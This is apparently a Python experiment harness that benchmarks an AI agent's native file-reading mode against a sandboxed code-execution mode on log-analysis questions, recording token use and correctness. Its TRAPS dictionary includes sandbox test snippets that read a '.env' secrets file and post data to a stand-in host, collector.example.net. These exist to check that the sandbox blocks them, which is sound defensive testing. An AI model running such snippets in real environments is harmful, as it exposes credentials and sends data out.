"""Thí nghiệm B2: cùng câu hỏi trên 30 file log — native (read_file từng file) vs Code Mode (run_code).

Ngoài ``usage``, đo thêm ``log_lines_in_context``: số dòng log thô còn nằm trong context cuối cùng
→ bằng chứng trực tiếp "raw log không đi vào context".
"""

from __future__ import annotations

import json
import re
import shutil
from pathlib import Path
from typing import Any

import yaml

from ..agent import Session
from ..codemode.runner import CodeRunner
from ..config import AGENTS_PATH, SCENARIOS_DIR, Settings
from ..context import read_agents_md
from ..llm import LLM
from ..policy import Policy
from ..recorder import Recorder
from ..tokens import render_message
from ..workspace.fixtures import generate, load_ground_truth
from ..workspace.tools import WorkspaceTools
from .grading import grade_b2

LOG_LINE = re.compile(r"\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}\.\d{3}Z (INFO|ERROR|WARN)")
MODES = {"native": ["list_files", "read_file"], "native-strict": ["list_files", "read_file"], "code": ["list_files"]}
# native-strict: buộc đọc đủ file như cách đo ở md §8 ("agent dùng read_file đọc từng log")
STRICT_HINT = (" Yêu cầu: đọc ĐẦY ĐỦ từng file log cần thiết bằng read_file (không truyền start_line/end_line), "
               "không ước lượng hay suy đoán số liệu.")


def load_questions() -> list[dict[str, Any]]:
    return yaml.safe_load((SCENARIOS_DIR / "b2_log_questions.yaml").read_text(encoding="utf-8"))["questions"]


def log_lines_in_context(messages: list[dict]) -> int:
    return sum(len(LOG_LINE.findall(render_message(m))) for m in messages)


def prepare_fixture(work_root: Path, log_lines: int = 200) -> Path:
    root = work_root / "b2_fixture"
    if not (root / "ground_truth.json").exists():
        shutil.rmtree(root, ignore_errors=True)
        generate(root, log_lines=log_lines)
    return root


def run_b2(mode: str, run_name: str, settings: Settings, llm: LLM, out_root: Path, work_root: Path,
           questions: list[dict[str, Any]] | None = None, log_lines: int = 200, verbose: bool = True) -> dict[str, Any]:
    questions = questions or load_questions()
    root = prepare_fixture(work_root, log_lines)
    truth = load_ground_truth(root)
    out = out_root / run_name
    shutil.rmtree(out, ignore_errors=True)
    # B2 đo riêng tác dụng của Code Mode: tắt compaction, window đủ lớn để không bị cắt
    s = settings.with_(context_window=1_000_000, tool_result_cap=50_000, max_steps=40)
    items = []
    for q in questions:
        rec = Recorder(out / q["id"], f"{run_name}-{q['id']}")
        ws = WorkspaceTools(root / "workspace", policy=Policy(allow_write=False))
        sess = Session(llm, ws, s, strategy="none", recorder=rec, agents_md=read_agents_md(AGENTS_PATH),
                       code_mode=(mode == "code"), tools=MODES[mode])
        try:
            r = sess.send(q["text"] + (STRICT_HINT if mode == "native-strict" else ""))
        except Exception as exc:  # vd. một request vượt quota token/phút của free tier
            items.append({"id": q["id"], "question": q["text"], "error": f"{type(exc).__name__}: {str(exc)[:300]}",
                          "stats": sess.stats(), "log_lines_in_context": log_lines_in_context(sess.messages),
                          "grade": {"correct": False}, "answer": "", "tool_calls": [], "code_runs": [], "code": []})
            _save(out, run_name, mode, settings, truth, items)
            sess.close()
            if verbose:
                print(f"[{run_name}] {q['id']}: LỖI {items[-1]['error'][:160]}", flush=True)
            continue
        grade = grade_b2(q["check"], r.text, truth)
        code_runs = sess.runner.runs if sess.runner else []
        item = {
            "id": q["id"], "question": q["text"], "answer": r.text, "grade": grade, "stats": sess.stats(),
            "tool_calls": [e.name for e in r.tool_events],
            "log_lines_in_context": log_lines_in_context(sess.messages),
            "code_runs": [{"ok": c.ok, "error": c.error, "tool_calls": c.tool_calls, "runtime_tokens": c.runtime_tokens,
                           "stdout_chars_total": c.stdout_chars_total, "elapsed_s": c.elapsed_s} for c in code_runs],
            "code": [e.args.get("code", "") for e in r.tool_events if e.name == "run_code"],
            "policy_denied": ws.policy.denied,
        }
        items.append(item)
        if verbose:
            st = item["stats"]
            print(f"[{run_name}] {q['id']}: correct={grade['correct']} llm_calls={st['llm_calls']} "
                  f"input={st['input_tokens']:,} peak={st['peak_context']:,} log_lines_in_ctx={item['log_lines_in_context']}",
                  flush=True)
        sess.close()
        _save(out, run_name, mode, settings, truth, items)  # lưu sau mỗi câu để không mất kết quả nếu bị dừng
    return _save(out, run_name, mode, settings, truth, items)


def _save(out: Path, run_name: str, mode: str, settings: Settings, truth: dict, items: list) -> dict[str, Any]:
    result = {"run": run_name, "mode": mode, "model": settings.model, "log_files": len(truth["log_files"]),
              "log_total_lines": truth["log_total_lines"], "items": items}
    out.mkdir(parents=True, exist_ok=True)
    (out / "result.json").write_text(json.dumps(result, ensure_ascii=False, indent=2), encoding="utf-8")
    return result


# ------------------------------------------------------------------ traps (md §6)
TRAPS: dict[str, str] = {
    "verified_count": (
        "import glob, re, collections\n"
        "c = collections.Counter(); files = glob.glob('logs/*.log'); bad = []\n"
        "for p in files:\n"
        "    try:\n"
        "        for line in open(p, encoding='utf-8'):\n"
        "            m = re.search(r' ERROR \\S+ (ERR_[A-Z0-9_]+)', line)\n"
        "            if m: c[m.group(1)] += 1\n"
        "    except Exception as e: bad.append(p)\n"
        "print(c.most_common(3)); print('files_scanned', len(files), 'errors', bad, 'total_matches', sum(c.values()))\n"
    ),
    "bloat_dump": "print(open('logs/app-2026-09-17.log', encoding='utf-8').read())\n",
    "infinite_loop": "while True:\n    pass\n",
    "read_env_via_proxy": "print(tools.read_file('.env'))\n",
    "read_env_direct": "print(open('.env').read())\n",
    "exfiltrate": "tools.http_post('https://collector.example.net/upload', {'data': 'x'})\nprint('sent')\n",
    "code_error": "print(open('logs/khong-ton-tai.log').read())\n",
    "proxy_count": (
        "files = tools.list_files('logs/*.log'); n = 0\n"
        "for p in files:\n"
        "    n += sum(1 for l in tools.read_file(p).splitlines() if ' ERROR ' in l)\n"
        "print('files', len(files), 'error_lines', n)\n"
    ),
}


def run_traps(settings: Settings, work_root: Path, out_root: Path) -> dict[str, Any]:
    """Chạy các bẫy trực tiếp trên runtime (không cần LLM) và ghi kết quả."""
    root = prepare_fixture(work_root)
    ws = WorkspaceTools(root / "workspace", policy=Policy(allow_write=False))
    runner = CodeRunner(ws, timeout=min(settings.code_timeout, 3.0), output_cap=settings.code_output_cap)
    results = {}
    for name, code in TRAPS.items():
        r = runner.run(code)
        results[name] = {"ok": r.ok, "error": r.error, "stdout": r.stdout[-600:], "stdout_chars_total": r.stdout_chars_total,
                         "context_chars": len(json.dumps(r.to_context(), ensure_ascii=False)),
                         "tool_calls": r.tool_calls, "runtime_tokens": r.runtime_tokens,
                         "denied": [d["reason"] for d in r.denied], "elapsed_s": r.elapsed_s}
    runner.close()
    out_root.mkdir(parents=True, exist_ok=True)
    (out_root / "traps.json").write_text(json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8")
    return results


def _fmt(v) -> str:
    return '—' if v is None else f'{v:,}'


def summarize(out_root: Path) -> str:
    rows = []
    totals: dict[str, dict[str, int]] = {}
    for p in sorted(out_root.glob("*/result.json")):
        r = json.loads(p.read_text(encoding="utf-8"))
        t = totals.setdefault(r["run"], {"input": 0, "calls": 0, "correct": 0, "n": 0, "peak": 0})
        for it in r["items"]:
            st = it["stats"]
            ok = "⚠️ lỗi" if it.get("error") else ("✅" if it["grade"]["correct"] else "❌")
            rows.append(f"| {r['run']} | {r['mode']} | {it['id']} | {ok} | "
                        f"{st['llm_calls']} | {st['peak_context']:,} | {st['input_tokens']:,} | "
                        f"{_fmt(it.get('log_lines_in_context'))} | {', '.join(it['tool_calls'][:6])}{'…' if len(it['tool_calls']) > 6 else ''} |")
            t["input"] += st["input_tokens"]
            t["calls"] += st["llm_calls"]
            t["correct"] += int(it["grade"]["correct"])
            t["n"] += 1
            t["peak"] = max(t["peak"], st["peak_context"])
    md = ["# B2 — Native vs Code Mode", "",
          "| Run | Chế độ | Câu | Đúng | LLM call | Context lớn nhất | Tổng input | Dòng log thô trong context | Tool calls |",
          "|---|---|---|---|---|---|---|---|---|", *rows, "", "## Tổng theo run", "",
          "| Run | Đúng | LLM call | Context lớn nhất | Tổng input |", "|---|---|---|---|---|"]
    for run, t in totals.items():
        md.append(f"| {run} | {t['correct']}/{t['n']} | {t['calls']} | {t['peak']:,} | {t['input']:,} |")
    traps = out_root / "traps.json"
    if traps.exists():
        md += ["", "## Bẫy (md §6) — chạy trực tiếp trên runtime", "", "| Bẫy | ok | Lỗi trả về model | Ký tự vào context | Bị chặn |",
               "|---|---|---|---|---|"]
        for name, r in json.loads(traps.read_text(encoding="utf-8")).items():
            md.append(f"| {name} | {r['ok']} | {(r['error'] or '').replace('|', '/')[:90]} | {r['context_chars']:,} | "
                      f"{'; '.join(r['denied'])[:80]} |")
    text = "\n".join(md) + "\n"
    (out_root / "summary.md").write_text(text, encoding="utf-8")
    return text
